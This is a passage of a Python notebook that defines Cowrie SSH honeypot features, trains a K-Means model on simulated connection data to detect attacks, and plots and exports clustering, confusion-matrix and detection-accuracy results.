        'training_samples': len(results['y_train']),
        'test_samples': len(results['y_test'])
    }

    with open('cowrie_knn_model_info.json', 'w') as f:
        json.dump(model_info, f, indent=2, default=str)

    print(f"\nüíæ EXPORT COMPLETE:")
    print("   üìÑ cowrie_honeypot_dataset.csv - Full dataset")
    print("   üìÑ cowrie_knn_model_info.json - Model information")

    print(f"\nüéâ COWRIE SSH HONEYPOT KNN TRAINING COMPLETE!")
    print(f"üéØ Final F1-Score: {results['metrics']['f1_score']:.4f}")
    print(f"üîç Model ready for SSH threat detection!")

else:
    print("‚ùå Feature preparation failed!")

# ========================================
# COWRIE DATASET FEATURE DEFINITIONS
# ========================================

def print_cowrie_features():
    """
    Print comprehensive Cowrie dataset feature definitions
    """

    # Session Features (Primary Dataset Fields)
    session_features = [
        {
            'icon': 'üìß',
            'name': 'session_id',
            'description': 'Unique session identifier',
            'data_type': 'string',
            'example': 'cowrie_session_00012345',
            'ml_importance': 'Low (identifier only)'
        },
        {
            'icon': 'üïê',
            'name': 'timestamp',
            'description': 'Attack timestamp (UTC)',
            'data_type': 'datetime',
            'example': '2025-10-28 15:30:45.123Z',
            'ml_importance': 'Medium (temporal analysis)'
        },
        {
            'icon': 'üåê',
            'name': 'src_ip',
            'description': "Attacker's IP address",
            'data_type': 'string',
            'example': '185.222.202.53',
            'ml_importance': 'High (geographic/behavioral)'
        },
        {
            'icon': 'üè¥',
            'name': 'src_country',
            'description': 'Geolocation (country code)',
            'data_type': 'string',
            'example': 'CN, RU, TR, VN',
            'ml_importance': 'High (risk assessment)'
        },
        {
            'icon': 'üë§',
            'name': 'username',
            'description': 'Login username attempted',
            'data_type': 'string',
            'example': 'root, admin, user, test',
            'ml_importance': 'Medium (attack pattern)'
        },
        {
            'icon': 'üîë',
            'name': 'password',
            'description': 'Password attempted',
            'data_type': 'string',
            'example': '123456, password, admin',
            'ml_importance': 'Medium (credential analysis)'
        },
        {
            'icon': '‚è±Ô∏è',
            'name': 'session_duration',
            'description': 'Total session time (seconds)',
            'data_type': 'integer',
            'example': '1200 (20 minutes)',
            'ml_importance': 'High (behavioral indicator)'
        },
        {
            'icon': 'üîÑ',
            'name': 'login_attempts',
            'description': 'Number of login tries',
            'data_type': 'integer',
            'example': '150 (brute force indicator)',
            'ml_importance': 'Very High (attack signature)'
        },
        {
            'icon': '‚úÖ',
            'name': 'successful_logins',
            'description': 'Successful authentication count',
            'data_type': 'integer',
            'example': '1 (0=failed, 1=successful)',
            'ml_importance': 'High (compromise indicator)'
        }
    ]

    # Derived Features for ML
    derived_features = [
        {
            'icon': 'üéØ',
            'name': 'attack_intensity',
            'formula': '(login_attempts √ó failed_attempts) / session_duration',
            'description': 'Measure of attack aggressiveness per time unit',
            'data_type': 'float',
            'range': '0.1 - 500.0 (higher = more intense)',
            'ml_importance': 'Very High (primary threat indicator)'
        },
        {
            'icon': 'üìä',
            'name': 'command_diversity',
            'formula': 'unique_commands / total_commands',
            'description': 'Ratio indicating command variety (exploration vs automation)',
            'data_type': 'float',
            'range': '0.0 - 1.0 (1.0 = all unique commands)',
            'ml_importance': 'High (human vs bot detection)'
        },
        {
            'icon': '‚ö†Ô∏è',
            'name': 'suspicious_ratio',
            'formula': 'suspicious_commands / unique_commands',
            'description': 'Proportion of malicious commands executed',
            'data_type': 'float',
            'range': '0.0 - 1.0 (1.0 = all commands malicious)',
            'ml_importance': 'Very High (malware indicator)'
        },
        {
            'icon': 'üíæ',
            'name': 'data_transfer_ratio',
            'formula': 'bytes_downloaded / bytes_uploaded',
            'description': 'Download vs upload activity (malware pull indicator)',
            'data_type': 'float',
            'range': '0.1 - 100.0 (>10 = heavy download)',
            'ml_importance': 'High (payload detection)'
        },
        {
            'icon': '‚è±Ô∏è',
            'name': 'temporal_features',
            'formula': 'hour_of_day, day_of_week, is_weekend',
            'description': 'Time-based attack pattern identification',
            'data_type': 'integer/boolean',
            'range': 'hour: 0-23, day: 0-6, weekend: 0/1',
            'ml_importance': 'Medium (pattern recognition)'
        },
        {
            'icon': 'üåç',
            'name': 'geographic_risk',
            'formula': 'country_risk_score based on attack frequency',
            'description': 'Risk assessment based on source country statistics',
            'data_type': 'integer',
            'range': '1-3 (1=low risk, 3=high risk countries)',
            'ml_importance': 'High (geopolitical threat assessment)'
        }
    ]

    # Print Session Features
    print("üçØ COWRIE SSH HONEYPOT DATASET - SESSION FEATURES")
    print("="*70)
    print("üìã Primary Dataset Fields (Raw Data from Honeypot Logs)")
    print("-"*70)

    for i, feature in enumerate(session_features, 1):
        print(f"{i:2d}. {feature['icon']} {feature['name']:<20} # {feature['description']}")
        print(f"     üìä Type: {feature['data_type']:<12} Example: {feature['example']}")
        print(f"     üéØ ML Importance: {feature['ml_importance']}")
        print()

    # Print Derived Features
    print("\nü§ñ DERIVED FEATURES FOR MACHINE LEARNING")
    print("="*70)
    print("üßÆ Engineered Features (Calculated from Raw Data)")
    print("-"*70)

    for i, feature in enumerate(derived_features, 1):
        print(f"{i:2d}. {feature['icon']} {feature['name']:<20}")
        print(f"     üìê Formula: {feature['formula']}")
        print(f"     üìù Description: {feature['description']}")
        print(f"     üìä Type: {feature['data_type']:<12} Range: {feature['range']}")
        print(f"     üéØ ML Importance: {feature['ml_importance']}")
        print()

    # Feature Summary Statistics
    print("\nüìà FEATURE SUMMARY FOR KNN MODEL")
    print("="*70)

    total_session_features = len(session_features)
    total_derived_features = len(derived_features)
    high_importance_features = len([f for f in session_features + derived_features
                                  if 'High' in f.get('ml_importance', '')])

    print(f"üìä Total Session Features: {total_session_features}")
    print(f"üßÆ Total Derived Features: {total_derived_features}")
    print(f"üéØ High Importance Features: {high_importance_features}")
    print(f"üìà Recommended for KNN: {total_session_features + total_derived_features} features")

    # Feature Categories for ML
    print(f"\nüîç FEATURE CATEGORIES FOR THREAT DETECTION:")
    print(f"   üö® Attack Signatures: login_attempts, attack_intensity, suspicious_ratio")
    print(f"   üïµÔ∏è Behavioral Analysis: command_diversity, session_duration, data_transfer_ratio")
    print(f"   üåç Geographic Intelligence: src_country, geographic_risk")
    print(f"   ‚è∞ Temporal Patterns: timestamp, temporal_features")
    print(f"   üé≠ Identity Analysis: username, password patterns")

    return session_features, derived_features

# Execute the function to print all features
if __name__ == "__main__":
    session_feat, derived_feat = print_cowrie_features()

    # Additional: Create Python lists for programmatic use
    print(f"\nüíª PYTHON LISTS FOR PROGRAMMING:")
    print("="*50)

    # Session feature names list
    session_feature_names = [f['name'] for f in session_feat]
    print("session_features = [")
    for feature in session_feature_names:
        print(f"    '{feature}',")
    print("]\n")

    # Derived feature names list
    derived_feature_names = [f['name'] for f in derived_feat]
    print("derived_features = [")
    for feature in derived_feature_names:
        print(f"    '{feature}',")
    print("]\n")

    # Combined feature list for ML
    all_features = session_feature_names + derived_feature_names
    print("all_ml_features = [")
    for feature in all_features:
        print(f"    '{feature}',")
    print("]\n")

    print(f"üéØ Total features for KNN model: {len(all_features)}")

# ========================================
# CELL 4: Initialize & Generate Data
# ========================================
# Initialize honeypot
honeypot = AlphaHoneypot()

# Generate traffic data
df = honeypot.generate_traffic(1200)

# Show basic statistics
print(f"\nüìä Dataset Summary:")
print(f"   Total Connections: {len(df)}")
print(f"   Attacks: {df['is_attack'].sum()} ({df['is_attack'].mean():.1%})")
print(f"   Normal: {(~df['is_attack']).sum()} ({(~df['is_attack']).mean():.1%})")
print(f"   Unique IPs: {df['source_ip'].nunique()}")
print(f"   Countries: {df['source_country'].nunique()}")
print(f"   Protocols: {', '.join(df['protocol'].unique())}")

# Display sample data
print(f"\nüîç Sample Data:")
display_df = df[['source_ip', 'source_country', 'protocol', 'connection_count',
                'failed_login_attempts', 'is_attack']].head()
print(display_df.to_string(index=False))

# ========================================
# CELL 5: Feature Extraction & Model Training
# ========================================
print("\nüîß FEATURE EXTRACTION & MODEL TRAINING")
print("="*50)

# Extract features
X, y = honeypot.extract_features(df)
print(f"üìà Features extracted: {X.shape}")
print(f"üéØ Feature names: {len(honeypot.feature_names)}")

# Train K-Means model
kmeans_results, X_scaled = honeypot.train_kmeans(X, y)

# Add cluster labels to dataframe
df['cluster'] = honeypot.kmeans_model['labels']

# Analyze clusters
print(f"\nüìä CLUSTER ANALYSIS:")
print("-"*30)
cluster_analysis = df.groupby('cluster')['is_attack'].agg(['count', 'sum', 'mean']).round(3)
cluster_analysis.columns = ['Total', 'Attacks', 'Attack_Rate']
print(cluster_analysis)

# ========================================
# CELL 6: Visualization Dashboard
# ========================================
print("\nüìä CREATING VISUALIZATION DASHBOARD")
print("="*50)

# Create comprehensive dashboard
fig = make_subplots(
    rows=3, cols=2,
    subplot_titles=[
        'üéØ K-Means Clustering Results (PCA)',
        'üìä Cluster vs Attack Distribution',
        'üåç Attack Sources by Country',
        '‚è∞ Attack Timeline',
        'üîç Feature Importance',
        'üìà Model Performance Metrics'
    ]
)

# 1. PCA Visualization of clusters
pca = PCA(n_components=2, random_state=42)
X_pca = pca.fit_transform(X_scaled)

colors = ['blue', 'red', 'green', 'orange', 'purple', 'brown', 'pink']
for cluster in range(len(set(honeypot.kmeans_model['labels']))):
    mask = honeypot.kmeans_model['labels'] == cluster
    fig.add_trace(
        go.Scatter(
            x=X_pca[mask, 0],
            y=X_pca[mask, 1],
            mode='markers',
            name=f'Cluster {cluster}',
            marker=dict(color=colors[cluster % len(colors)], size=6)
        ),
        row=1, col=1
    )

# 2. Cluster vs Attack Rate
cluster_stats = df.groupby('cluster')['is_attack'].mean()
fig.add_trace(
    go.Bar(
        x=cluster_stats.index.astype(str),
        y=cluster_stats.values,
        name='Attack Rate',
        marker_color='red'
    ),
    row=1, col=2
)

# 3. Attack Sources by Country
attack_countries = df[df['is_attack']]['source_country'].value_counts().head(10)
fig.add_trace(
    go.Bar(
        x=attack_countries.values,
        y=attack_countries.index,
        orientation='h',
        name='Attacks by Country',
        marker_color='orange'
    ),
    row=2, col=1
)

# 4. Attack Timeline (hourly)
hourly_attacks = df[df['is_attack']]['hour_of_day'].value_counts().sort_index()
fig.add_trace(
    go.Scatter(
        x=hourly_attacks.index,
        y=hourly_attacks.values,
        mode='lines+markers',
        name='Attacks per Hour',
        line=dict(color='red', width=3)
    ),
    row=2, col=2
)

# 5. Feature Importance (correlation with attacks)
feature_importance = []
for feature in honeypot.feature_names:
    if feature in df.columns:  # Check if feature exists in dataframe
        correlation = abs(df[feature].corr(df['is_attack'].astype(int)))
        feature_importance.append((feature, correlation))

feature_importance.sort(key=lambda x: x[1], reverse=True)
top_features = feature_importance[:8]

fig.add_trace(
    go.Bar(
        x=[f[1] for f in top_features],
        y=[f[0].replace('_', ' ').title() for f in top_features],
        orientation='h',
        name='Feature Importance',
        marker_color='green'
    ),
    row=3, col=1
)

# 6. K-Means Performance Metrics
k_values = list(kmeans_results.keys())
silhouette_scores = [kmeans_results[k]['silhouette_score'] for k in k_values]
inertias = [kmeans_results[k]['inertia'] for k in k_values]

fig.add_trace(
    go.Scatter(
        x=k_values,
        y=silhouette_scores,
        mode='lines+markers',
        name='Silhouette Score',
        line=dict(color='blue', width=3),
        yaxis='y'
    ),
    row=3, col=2
)

# Update layout
fig.update_layout(
    title="üçØ Alpha AI-Powered Honeypot - K-Means Analysis Dashboard",
    height=1000,
    showlegend=True
)

fig.show()

# ========================================
# CELL 7: Performance Metrics Calculation
# ========================================
print("\nüìà PERFORMANCE METRICS CALCULATION")
print("="*50)

def calculate_performance_metrics(df, kmeans_results, honeypot_model):
    """Calculate comprehensive performance metrics - SAFE VERSION"""

    metrics = {}

    # Basic Statistics
    metrics['total_connections'] = len(df)
    metrics['attack_connections'] = int(df['is_attack'].sum())
    metrics['attack_rate'] = float(df['is_attack'].mean())
    metrics['unique_ips'] = int(df['source_ip'].nunique())
    metrics['unique_countries'] = int(df['source_country'].nunique())

    # Attack Analysis
    attack_df = df[df['is_attack'] == True]

    if len(attack_df) > 0:
        metrics['top_attack_country'] = str(attack_df['source_country'].value_counts().index[0])
        metrics['peak_attack_hour'] = int(attack_df['hour_of_day'].value_counts().index[0])

        # Only calculate if attack_intensity column exists
        if 'attack_intensity' in attack_df.columns:
            metrics['avg_attack_intensity'] = float(attack_df['attack_intensity'].mean())
        else:
            metrics['avg_attack_intensity'] = 0.0

        metrics['max_connections_per_attack'] = int(attack_df['connection_count'].max())
    else:
        metrics.update({
            'top_attack_country': 'None',
            'peak_attack_hour': 0,
            'avg_attack_intensity': 0.0,
            'max_connections_per_attack': 0
        })

    # K-Means Model Performance
    if honeypot_model and honeypot_model.kmeans_model:
        best_k = len(set(honeypot_model.kmeans_model['labels']))
        metrics['optimal_k'] = int(best_k)
        metrics['silhouette_score'] = float(honeypot_model.kmeans_model['silhouette_score'])
        metrics['model_inertia'] = float(honeypot_model.kmeans_model['inertia'])

        # Cluster Quality Analysis
        if 'cluster' in df.columns:
            for cluster in range(best_k):
                cluster_data = df[df['cluster'] == cluster]
                if len(cluster_data) > 0:
                    attack_rate = float(cluster_data['is_attack'].mean())
                    metrics[f'cluster_{cluster}_attack_rate'] = attack_rate
                    metrics[f'cluster_{cluster}_size'] = int(len(cluster_data))
    else:
        metrics.update({
            'optimal_k': 0,
            'silhouette_score': 0.0,
            'model_inertia': 0.0
        })

    # Geographic Distribution
    if len(attack_df) > 0:
        country_counts = attack_df['source_country'].value_counts(normalize=True)
        country_entropy = -(country_counts * np.log(country_counts + 1e-10)).sum()
        metrics['geographic_entropy'] = float(country_entropy)
    else:
        metrics['geographic_entropy'] = 0.0

    return metrics

# Calculate metrics safely
if X is not None and honeypot.kmeans_model is not None:
    performance_metrics = calculate_performance_metrics(df, kmeans_results, honeypot)

    # Display metrics
    print("üéØ HONEYPOT PERFORMANCE SUMMARY:")
    print("-"*40)
    for key, value in performance_metrics.items():
        if isinstance(value, float):
            if 'rate' in key or 'entropy' in key or 'score' in key:
                print(f"{key.replace('_', ' ').title()}: {value:.4f}")
            else:
                print(f"{key.replace('_', ' ').title()}: {value:.2f}")
        else:
            print(f"{key.replace('_', ' ').title()}: {value}")

    # Create performance summary visualization
    fig_perf = make_subplots(
        rows=2, cols=2,
        subplot_titles=[
            'üìä Cluster Size Distribution',
            'üéØ Attack Rate by Cluster',
            '‚ö° Attack Intensity Distribution',
            'üåç Top Attack Countries'
        ]
    )

    # 1. Cluster sizes
    if 'cluster' in df.columns:
        cluster_sizes = df['cluster'].value_counts().sort_index()
        fig_perf.add_trace(
            go.Bar(x=cluster_sizes.index.astype(str), y=cluster_sizes.values,
                   name='Cluster Size', marker_color='skyblue'),
            row=1, col=1
        )

        # 2. Attack rate by cluster
        cluster_attack_rates = df.groupby('cluster')['is_attack'].mean()
        fig_perf.add_trace(
            go.Bar(x=cluster_attack_rates.index.astype(str), y=cluster_attack_rates.values,
                   name='Attack Rate', marker_color='red'),
            row=1, col=2
        )

    # 3. Attack intensity distribution
    attack_df = df[df['is_attack'] == True]
    if len(attack_df) > 0 and 'attack_intensity' in attack_df.columns:
        fig_perf.add_trace(
            go.Histogram(x=attack_df['attack_intensity'], nbinsx=20,
                        name='Attack Intensity', marker_color='orange'),
            row=2, col=1
        )

    # 4. Top attack countries
    if len(attack_df) > 0:
        top_countries = attack_df['source_country'].value_counts().head(8)
        fig_perf.add_trace(
            go.Bar(x=top_countries.index, y=top_countries.values,
                   name='Country Attacks', marker_color='purple'),
            row=2, col=2
        )

    fig_perf.update_layout(
        title="üìà Performance Metrics - Alpha K-Means Honeypot",
        height=600,
        showlegend=False
    )

    fig_perf.show()

else:
    print("‚ùå Skipping performance metrics due to missing model")

# ========================================
# CELL 8: Real-time Detection Demo
# ========================================
print("\nüö® REAL-TIME THREAT DETECTION DEMO")
print("="*50)

def demo_real_time_detection(num_tests=10):
    """Demonstrate real-time threat detection"""

    if not honeypot.kmeans_model:
        print("‚ùå No model available for real-time detection")
        return [], 0

    print(f"üîÑ Running {num_tests} real-time detection tests...\n")

    results = []
    correct_predictions = 0

    for i in range(num_tests):
        # Generate new connection
        test_connection = honeypot.simulate_connection()

        # Predict threat
        prediction = honeypot.predict_threat(test_connection)

        if 'error' in prediction:
            print(f"‚ùå Test {i+1}: Prediction failed - {prediction['error']}")
            continue

        # Determine if prediction is correct (simplified)
        actual = "ATTACK" if test_connection['is_attack'] else "NORMAL"
        predicted_attack = prediction['threat_level'] in ['HIGH', 'CRITICAL']
        actual_attack = test_connection['is_attack']

        is_correct = predicted_attack == actual_attack
        if is_correct:
            correct_predictions += 1

        # Display result
        status_icon = "‚úÖ" if is_correct else "‚ùå"
        threat_icon = "üö®" if test_connection['is_attack'] else "üîí"

        print(f"{status_icon} Test {i+1}: {test_connection['source_ip']} ({test_connection['source_country']})")
        print(f"   {threat_icon} Actual: {actual}")
        print(f"   ü§ñ Predicted: {prediction['threat_level']} (Cluster {prediction['cluster']})")
        print(f"   üìä Confidence: {prediction['confidence']:.2%}")
        print(f"   üìà Connections: {test_connection['connection_count']}")
        print()

        results.append({
            'test_id': i+1,
            'source_ip': test_connection['source_ip'],
            'country': test_connection['source_country'],
            'actual': actual,
            'predicted': prediction['threat_level'],
            'cluster': prediction['cluster'],
            'confidence': prediction['confidence'],
            'correct': is_correct
        })

    accuracy = correct_predictions / len(results) if results else 0
    print(f"üéØ Real-time Detection Accuracy: {accuracy:.1%} ({correct_predictions}/{len(results)})")

    return results, accuracy

# Run real-time detection demo
demo_results, demo_accuracy = demo_real_time_detection()

# ========================================
# CELL 8.5: Confusion Matrix Analysis
# ========================================
print("\nüìä CONFUSION MATRIX ANALYSIS")
print("="*50)

from sklearn.metrics import confusion_matrix, classification_report, accuracy_score
from sklearn.metrics import precision_score, recall_score, f1_score, roc_auc_score
import matplotlib.pyplot as plt
import seaborn as sns

def create_confusion_matrix_analysis(df, honeypot_model):
    """
    Create comprehensive confusion matrix analysis for the honeypot system
    """

    if not honeypot_model.kmeans_model or 'cluster' not in df.columns:
        print("‚ùå Model or cluster data not available for confusion matrix")
        return None

    print("üîÑ Generating predictions for confusion matrix...")

    # Method 1: Use cluster-based prediction
    # Map clusters to attack prediction based on cluster purity
    cluster_attack_rates = df.groupby('cluster')['is_attack'].mean()

    # Clusters with >50% attack rate are considered "attack clusters"
    attack_clusters = cluster_attack_rates[cluster_attack_rates > 0.5].index.tolist()

    # Generate predictions based on cluster membership
    df['predicted_attack'] = df['cluster'].apply(lambda x: 1 if x in attack_clusters else 0)

    # True labels
    y_true = df['is_attack'].astype(int)
    y_pred = df['predicted_attack']

    print(f"üéØ Attack clusters identified: {attack_clusters}")
    print(f"üìä Cluster attack rates:")
    for cluster, rate in cluster_attack_rates.items():
        status = "ATTACK" if cluster in attack_clusters else "NORMAL"
        print(f"   Cluster {cluster}: {rate:.3f} -> {status}")

    return y_true, y_pred, attack_clusters

def plot_confusion_matrices(y_true, y_pred, attack_clusters):
    """
    Plot comprehensive confusion matrix visualizations
    """

    # Calculate confusion matrix
    cm = confusion_matrix(y_true, y_pred)

    # Calculate metrics
    accuracy = accuracy_score(y_true, y_pred)
    precision = precision_score(y_true, y_pred, zero_division=0)
    recall = recall_score(y_true, y_pred, zero_division=0)
    f1 = f1_score(y_true, y_pred, zero_division=0)

    # Create comprehensive visualization
    fig, axes = plt.subplots(2, 2, figsize=(15, 12))

    # 1. Confusion Matrix Heatmap
    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues',
                xticklabels=['Normal', 'Attack'],
                yticklabels=['Normal', 'Attack'],
                ax=axes[0, 0])
    axes[0, 0].set_title('üéØ Confusion Matrix\n(K-Means Based Prediction)', fontsize=14, fontweight='bold')
    axes[0, 0].set_xlabel('Predicted Label')
    axes[0, 0].set_ylabel('True Label')

    # Add percentage annotations
    total = cm.sum()
    for i in range(2):
        for j in range(2):
            percentage = (cm[i, j] / total) * 100
            axes[0, 0].text(j + 0.5, i + 0.7, f'({percentage:.1f}%)',
                           ha='center', va='center', fontsize=10, color='red')

    # 2. Normalized Confusion Matrix
    cm_normalized = confusion_matrix(y_true, y_pred, normalize='true')
    sns.heatmap(cm_normalized, annot=True, fmt='.3f', cmap='Oranges',
                xticklabels=['Normal', 'Attack'],
                yticklabels=['Normal', 'Attack'],
                ax=axes[0, 1])
    axes[0, 1].set_title('üìà Normalized Confusion Matrix\n(Row-wise Normalization)', fontsize=14, fontweight='bold')
    axes[0, 1].set_xlabel('Predicted Label')
    axes[0, 1].set_ylabel('True Label')

    # 3. Performance Metrics Bar Chart
    metrics_names = ['Accuracy', 'Precision', 'Recall', 'F1-Score']
    metrics_values = [accuracy, precision, recall, f1]
    colors = ['skyblue', 'lightgreen', 'orange', 'pink']

    bars = axes[1, 0].bar(metrics_names, metrics_values, color=colors, alpha=0.8)
    axes[1, 0].set_title('üìä Performance Metrics', fontsize=14, fontweight='bold')
    axes[1, 0].set_ylabel('Score')
    axes[1, 0].set_ylim(0, 1)

    # Add value labels on bars
    for bar, value in zip(bars, metrics_values):
        height = bar.get_height()
        axes[1, 0].text(bar.get_x() + bar.get_width()/2., height + 0.02,
                       f'{value:.3f}', ha='center', va='bottom', fontweight='bold')

    # Add grid
    axes[1, 0].grid(True, alpha=0.3)

    # 4. Classification Report Visualization
    report_dict = classification_report(y_true, y_pred,
                                      target_names=['Normal', 'Attack'],
                                      output_dict=True, zero_division=0)

    # Create a heatmap for classification report
    report_df = pd.DataFrame(report_dict).iloc[:-1, :3].T  # Exclude 'support' and summary rows
    sns.heatmap(report_df, annot=True, fmt='.3f', cmap='Greens',
                ax=axes[1, 1])
    axes[1, 1].set_title('üîç Classification Report Heatmap', fontsize=14, fontweight='bold')
    axes[1, 1].set_xlabel('Classes')
    axes[1, 1].set_ylabel('Metrics')

    plt.tight_layout()
    plt.show()

    return cm, accuracy, precision, recall, f1

def detailed_error_analysis(df, y_true, y_pred):
    """
    Perform detailed error analysis
    """
    print("\nüîç DETAILED ERROR ANALYSIS")
    print("-"*40)

    # Add prediction results to dataframe for analysis
    df_analysis = df.copy()
    df_analysis['y_true'] = y_true
    df_analysis['y_pred'] = y_pred
    df_analysis['correct'] = (y_true == y_pred)

    # Calculate error types
    true_positives = ((y_true == 1) & (y_pred == 1)).sum()
    true_negatives = ((y_true == 0) & (y_pred == 0)).sum()
    false_positives = ((y_true == 0) & (y_pred == 1)).sum()
    false_negatives = ((y_true == 1) & (y_pred == 0)).sum()

    print(f"‚úÖ True Positives (Correctly detected attacks): {true_positives}")
    print(f"‚úÖ True Negatives (Correctly detected normal): {true_negatives}")
    print(f"‚ùå False Positives (Normal classified as attack): {false_positives}")
    print(f"‚ùå False Negatives (Attack classified as normal): {false_negatives}")

    # Analyze false positives
    if false_positives > 0:
        print(f"\nüîç FALSE POSITIVES ANALYSIS:")
        fp_data = df_analysis[(y_true == 0) & (y_pred == 1)]
        print(f"   Most common countries: {fp_data['source_country'].value_counts().head(3).to_dict()}")
        print(f"   Most common protocols: {fp_data['protocol'].value_counts().to_dict()}")
        if 'attack_intensity' in fp_data.columns:
            print(f"   Avg attack intensity: {fp_data['attack_intensity'].mean():.3f}")
        print(f"   Avg connections: {fp_data['connection_count'].mean():.1f}")

    # Analyze false negatives
    if false_negatives > 0:
        print(f"\nüîç FALSE NEGATIVES ANALYSIS:")
        fn_data = df_analysis[(y_true == 1) & (y_pred == 0)]
        print(f"   Most common countries: {fn_data['source_country'].value_counts().head(3).to_dict()}")
        print(f"   Most common protocols: {fn_data['protocol'].value_counts().to_dict()}")
        if 'attack_intensity' in fn_data.columns:
            print(f"   Avg attack intensity: {fn_data['attack_intensity'].mean():.3f}")
        print(f"   Avg connections: {fn_data['connection_count'].mean():.1f}")

    return df_analysis

def create_cluster_confusion_analysis(df):
    """
    Create cluster-specific confusion analysis
    """
    print(f"\nüéØ CLUSTER-SPECIFIC ANALYSIS")
    print("-"*40)

    cluster_stats = []

    for cluster in sorted(df['cluster'].unique()):
        cluster_data = df[df['cluster'] == cluster]

        if len(cluster_data) > 0:
            attack_rate = cluster_data['is_attack'].mean()
            size = len(cluster_data)
            countries = cluster_data['source_country'].nunique()
            protocols = cluster_data['protocol'].value_counts().to_dict()

            cluster_stats.append({
                'Cluster': cluster,
                'Size': size,
                'Attack_Rate': f"{attack_rate:.3f}",
                'Countries': countries,
                'Top_Protocol': max(protocols, key=protocols.get),
                'Classification': 'ATTACK' if attack_rate > 0.5 else 'NORMAL'
            })

            print(f"Cluster {cluster}:")
            print(f"   üìä Size: {size} connections")
            print(f"   üö® Attack Rate: {attack_rate:.3f}")
            print(f"   üåç Countries: {countries}")
            print(f"   üì° Protocols: {protocols}")
            print(f"   üéØ Classification: {'ATTACK' if attack_rate > 0.5 else 'NORMAL'}")
            print()

    # Create cluster stats DataFrame
    cluster_df = pd.DataFrame(cluster_stats)
    print("üìã CLUSTER SUMMARY TABLE:")
    print(cluster_df.to_string(index=False))

    return cluster_df

# Execute confusion matrix analysis
if X is not None and honeypot.kmeans_model is not None:

    # Generate predictions and confusion matrix
    result = create_confusion_matrix_analysis(df, honeypot)

    if result is not None:
        y_true, y_pred, attack_clusters = result

        # Plot confusion matrices and get metrics
        cm, accuracy, precision, recall, f1 = plot_confusion_matrices(y_true, y_pred, attack_clusters)

        # Print detailed metrics
        print(f"\nüìà PERFORMANCE SUMMARY:")
        print("="*30)
        print(f"üéØ Accuracy:  {accuracy:.4f} ({accuracy*100:.1f}%)")
        print(f"üìä Precision: {precision:.4f} ({precision*100:.1f}%)")
        print(f"üîç Recall:    {recall:.4f} ({recall*100:.1f}%)")
        print(f"‚öñÔ∏è  F1-Score:  {f1:.4f} ({f1*100:.1f}%)")

        # Detailed classification report
        print(f"\nüìã DETAILED CLASSIFICATION REPORT:")
        print("-"*50)
        report = classification_report(y_true, y_pred,
                                     target_names=['Normal', 'Attack'],
                                     zero_division=0)
        print(report)

        # Error analysis
        df_analysis = detailed_error_analysis(df, y_true, y_pred)

        # Cluster analysis
        cluster_df = create_cluster_confusion_analysis(df)

        # Store results for export
        confusion_results = {
            'confusion_matrix': cm.tolist(),
            'accuracy': float(accuracy),
            'precision': float(precision),
            'recall': float(recall),
            'f1_score': float(f1),
            'attack_clusters': attack_clusters,
            'classification_report': classification_report(y_true, y_pred,
                                                         target_names=['Normal', 'Attack'],
                                                         output_dict=True, zero_division=0)
        }

        # Export confusion matrix results
        with open('confusion_matrix_results.json', 'w') as f:
            json.dump(confusion_results, f, indent=2, default=str)

        # Export detailed analysis
        df_analysis[['source_ip', 'source_country', 'protocol', 'cluster',
                    'is_attack', 'predicted_attack', 'correct']].to_csv('confusion_analysis.csv', index=False)

        print(f"\nüíæ EXPORTED FILES:")
        print("   üìÑ confusion_matrix_results.json - Metrics and results")
        print("   üìä confusion_analysis.csv - Detailed prediction analysis")

        # Interactive Plotly confusion matrix
        print(f"\nüìä Creating Interactive Confusion Matrix...")

        fig_interactive = make_subplots(
            rows=1, cols=2,
            subplot_titles=['üéØ Confusion Matrix', 'üìà Performance Metrics'],
            specs=[[{"type": "heatmap"}, {"type": "bar"}]]
        )

        # Interactive confusion matrix
        fig_interactive.add_trace(
            go.Heatmap(
                z=cm,
                x=['Normal', 'Attack'],
                y=['Normal', 'Attack'],
                colorscale='Blues',
                showscale=True,
                text=[[f'{cm[i][j]}<br>({(cm[i][j]/cm.sum())*100:.1f}%)' for j in range(2)] for i in range(2)],
                texttemplate='%{text}',
                textfont={"size": 12}
            ),
            row=1, col=1
        )

        # Performance metrics bar chart
        fig_interactive.add_trace(
            go.Bar(
                x=['Accuracy', 'Precision', 'Recall', 'F1-Score'],
                y=[accuracy, precision, recall, f1],
                text=[f'{v:.3f}' for v in [accuracy, precision, recall, f1]],
                textposition='auto',
                marker_color=['skyblue', 'lightgreen', 'orange', 'pink']
            ),
            row=1, col=2
        )

        fig_interactive.update_layout(
            title="üçØ Alpha Honeypot - Confusion Matrix & Performance Analysis",
            height=500,
            showlegend=False
        )

        fig_interactive.show()

    else:
        print("‚ùå Could not generate confusion matrix - insufficient data")

else:
    print("‚ùå Model not available for confusion matrix analysis")

# CELL 9: Export Results & Summary
# ========================================
print(f"\nüíæ EXPORTING RESULTS")
print("="*50)



# Create comprehensive summary
summary = {
    'honeypot_configuration': {
        'ssh_port': honeypot.ssh_port,
        'web_port': honeypot.web_port,
        'ml_algorithm': 'K-Means Clustering'
    },
    'dataset_summary': {
        'total_connections': len(df),
        'attack_rate': f"{df['is_attack'].mean():.2%}",
        'unique_countries': df['source_country'].nunique(),
        'protocols': df['protocol'].unique().tolist(),
        'features_calculated': len(df.columns)
    }
}

# Add performance metrics if available
if X is not None and honeypot.kmeans_model is not None:
    summary['model_performance'] = {
        'optimal_k': performance_metrics['optimal_k'],
        'silhouette_score': performance_metrics['silhouette_score'],
        'model_inertia': performance_metrics['model_inertia'],
        'features_used': len(honeypot.feature_names)
    }
    summary['threat_analysis'] = {
        'top_attack_country': performance_metrics['top_attack_country'],
        'peak_attack_hour': performance_metrics['peak_attack_hour'],
        'avg_attack_intensity': performance_metrics['avg_attack_intensity']
    }

# Add real-time performance if available
if demo_results:
    summary['real_time_performance'] = {
        'detection_accuracy': demo_accuracy,
        'tests_conducted': len(demo_results)
    }

# Export summary
with open('alpha_honeypot_summary.json', 'w') as f:
    json.dump(summary, f, indent=2, default=str)
print("üìÑ Exported: alpha_honeypot_summary.json")

# ========================================
# CELL 10: Final Summary Display
# ========================================
print(f"\nüéâ ALPHA AI-POWERED HONEYPOT ANALYSIS COMPLETE!")
print("="*60)
print(f"üçØ System Type: AI-Powered K-Means Honeypot")
print(f"üì° Protocols: SSH (Port {honeypot.ssh_port}), HTTP (Port {honeypot.web_port})")
print(f"üîç Connections Analyzed: {len(df):,}")
print(f"üö® Attack Detection Rate: {df['is_attack'].mean():.1%}")

if X is not None and honeypot.kmeans_model is not None:
